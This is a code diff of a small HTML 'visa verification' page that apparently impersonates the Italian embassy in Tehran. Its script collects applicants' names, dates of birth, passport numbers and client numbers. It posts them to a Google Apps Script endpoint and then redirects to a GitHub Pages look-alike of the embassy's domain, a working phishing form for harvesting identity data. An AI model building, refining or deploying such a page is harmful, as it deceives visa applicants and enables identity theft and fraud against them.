@@ -2,77 +2,58 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Visa Check</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Visa Form</title>
   <style>
-    body {
-      font-family: sans-serif;
-      max-width: 400px;
-      margin: 30px auto;
-      padding: 20px;
-      border: 2px solid #ccc;
-      border-radius: 10px;
-    }
-    input, button {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-    }
-    #error {
-      color: red;
-      display: none;
-      text-align: center;
-    }
+    body { font-family: sans-serif; padding: 20px; max-width: 400px; margin: auto; }
+    input, button { display: block; margin: 10px 0; width: 100%; padding: 10px; }
+    #error { color: red; display: none; }
   </style>
 </head>
 <body>
-  <h2>Visa Information Form</h2>
-  <form id="form">
-    <input type="text" id="name" placeholder="Name" required />
-    <input type="text" id="lastName" placeholder="Last Name" required />
-    <input type="text" id="dob" placeholder="Date of Birth (MM/DD/YYYY)" required />
-    <input type="text" id="passportNo" placeholder="Passport Number" required />
-    <input type="text" id="clientNo" placeholder="Client Number" required />
-    <button type="submit">Submit</button>
-    <p id="error">اطلاعات درست نیست. لطفاً بررسی کنید.</p>
-  </form>
+  <h2>Visa Verification Form</h2>
+  <input type="text" id="name" placeholder="Name" required />
+  <input type="text" id="lastName" placeholder="Last Name" required />
+  <input type="text" id="dob" placeholder="Date of Birth (MM/DD/YYYY)" required />
+  <input type="text" id="passportNo" placeholder="Passport No" required />
+  <input type="text" id="clientNo" placeholder="Client No" required />
+  <button onclick="submitForm()">Submit</button>
+  <div id="error">The information does not match our records.</div>
 
   <script>
-    const form = document.getElementById('form');
-    const errorMsg = document.getElementById('error');
-
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      errorMsg.style.display = "none";
+    function submitForm() {
+      document.getElementById("error").style.display = "none";
 
       const data = {
-        name: document.getElementById('name').value.trim().toLowerCase(),
-        lastName: document.getElementById('lastName').value.trim().toLowerCase(),
-        dob: document.getElementById('dob').value.trim(),
-        passportNo: document.getElementById('passportNo').value.trim().toUpperCase(),
-        clientNo: document.getElementById('clientNo').value.trim()
+        name: document.getElementById("name").value.trim(),
+        lastName: document.getElementById("lastName").value.trim(),
+        dob: document.getElementById("dob").value.trim(),
+        passportNo: document.getElementById("passportNo").value.trim(),
+        clientNo: document.getElementById("clientNo").value.trim()
       };
 
-      try {
-        const response = await fetch('https://script.google.com/macros/s/AKfycbxPidcW21754EFk8J6TY8S2qJHBBglSCO7jPphUk5n1BVtHyb9RSmCKJEZI3S-VThL0yw/exec', {
-          method: 'POST',
-          body: JSON.stringify(data),
-          headers: {
-            'Content-Type': 'application/json'
-          }
-        });
-
-        const result = await response.json();
-        if (result.status === "success") {
+      fetch("https://script.google.com/macros/s/AKfycbxPidcW21754EFk8J6TY8S2qJHBBglSCO7jPphUk5n1BVtHyb9RSmCKJEZI3S-VThL0yw/exec", {
+        method: "POST",
+        body: JSON.stringify(data),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      })
+      .then(res => res.json())
+      .then(response => {
+        if (response.status === "success") {
           setTimeout(() => {
             window.location.href = "https://ambteheran.github.io/https-ambteheran.esteri.it-it-/";
           }, 3000);
         } else {
-          errorMsg.style.display = "block";
+          document.getElementById("error").style.display = "block";
         }
-      } catch (error) {
-        errorMsg.style.display = "block";
-      }
-    });
+      })
+      .catch(err => {
+        console.error("Error:", err);
+        document.getElementById("error").style.display = "block";
+      });
+    }
   </script>
 </body>
 </html>
